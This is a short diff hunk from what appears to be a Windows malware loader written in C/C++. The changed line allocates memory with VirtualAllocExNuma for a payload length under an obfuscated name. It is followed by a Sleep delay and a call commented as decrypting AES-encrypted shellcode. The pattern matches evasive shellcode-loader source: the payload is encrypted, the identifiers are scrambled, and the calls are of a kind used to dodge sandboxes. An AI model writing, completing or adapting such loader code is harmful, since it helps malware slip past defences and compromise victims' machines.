@@ -55,7 +55,7 @@ int main() {
 
    
 
-    LPVOID coohsllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
+    LPVOID coohsllo = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
     Sleep(1000);
     aeaesdecokaes((char*)karic0d2, sizeof(karic0d2), karik12y, sizeof(karik12y));  // Decrypt AES shellcode
 
